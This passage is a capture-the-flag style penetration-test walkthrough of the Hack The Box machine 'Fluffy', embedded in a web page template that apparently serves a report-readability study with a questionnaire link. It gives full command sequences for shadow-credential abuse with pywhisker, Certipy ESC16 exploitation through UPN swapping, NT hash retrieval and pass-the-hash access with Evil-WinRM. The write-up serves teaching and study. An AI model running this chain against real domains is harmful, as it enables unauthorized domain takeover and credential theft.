└─$ uv run /opt/pywhisker/pywhisker/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p '<PASSWORD_REDACTED>' --target 'ca_svc' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 17be9476-c03e-b2b0-4a05-060e3c579b0f
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 1O3LKuWu.pfx
[+] Saved PFX (#PKCS12) certificate & key at path: 1O3LKuWu.pfx
[*] Must be used with password: <PASSWORD_REDACTED>

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad auth -pfx '1O3LKuWu.pfx' -dc-ip $IP -password <PASSWORD_REDACTED> -domain fluffy.htb -username 'ca_svc'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': <LM_HASH_REDACTED>:<NT_HASH_REDACTED>
```

With the `ca_svc` credentials, the tester used [[Certipy]] to interact with [[AD CS]] and assess it for common misconfigurations.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad find -u ca_svc -hashes :<NT_HASH_REDACTED> -target dc01.fluffy.htb -text -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

The tester had to run the [[Certipy]] command more than once because it initially found nothing.

The scan showed that the host is likely vulnerable to [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) due to the security extension being disabled. The tester followed [[Certipy|Certipy's]] ESC16 documentation, and performed the following steps:

1. The tester read the current [[UPN]] of `ca_svc` so that the tester could restore the value. Restoring the value is a necessary step in the [[exploitation]] chain.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :<NT_HASH_REDACTED> -dc-ip $IP -user 'ca_svc' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
```

2. The tester updated `ca_svc`’s [[UPN]] to the target administrator's sAMAccountName.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :<NT_HASH_REDACTED> -dc-ip $IP -user 'ca_svc' -upn 'administrator' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

3. The tester verified that the [[UPN]] was updated.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :<NT_HASH_REDACTED> -dc-ip $IP -user 'ca_svc' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    userPrincipalName                   : administrator
```

4. The tester requested the administrator certificate as `ca_svc`.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad req -u 'ca_svc@fluffy.htb' -hashes :<NT_HASH_REDACTED> -ca 'fluffy-DC01-CA' -dc-ip $IP -dc-host dc01.fluffy.htb -template 'User'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

5. The tester restored `ca_svc`’s [[UPN]] back to its original value.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :<NT_HASH_REDACTED> -dc-ip $IP -dc-host dc01.fluffy.htb -upn 'ca_svc' -user 'ca_svc' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

The tester retrieved the administrator's [[TGT]] using the issued administrator certificate. The [[TGT]] is then used to retrieve the administrator's [[NT hash]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad -debug auth -pfx administrator.pfx -domain fluffy.htb -dc-ip $IP
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': <LM_HASH_REDACTED>:<NT_HASH_REDACTED>
```

With the administrator [[NT hash]], the tester was able to connect to the target over [[WinRM]] using [[Evil-WinRM]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ evil-winrm -i fluffy.htb -u administrator -H '<NT_HASH_REDACTED>'
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
```

With shell access as administrator, the tester had achieved full compromise of the target and the [[domain]].
  {% endcapture %}

  {% capture glossaryified_report %}
    {% include glossaryify.html content=report %}
  {% endcapture %}

  {{ glossaryified_report | markdownify }}
</div>

  <div class="evaluation-questionnaire-box">
    <h2>Questionnaire</h2>
    <p>
      After reading the sample report, please submit your responses using the form below.
    </p>
    <a
      class="evaluation-button"
      href="https://forms.gle/DCJpeG1tbWxCVkyMA"
      target="_blank"
      rel="noopener">
      Open Questionnaire
    </a>
  </div>

  <p class="evaluation-return-link">
    <a class="evaluation-back-link" href="#technical-walkthrough">
      ↑ Return to beginning of Technical Walkthrough
    </a>
  </p>

</div>


<script defer src="{{ '/assets/js/glossary-tooltips.js' | relative_url }}"></script>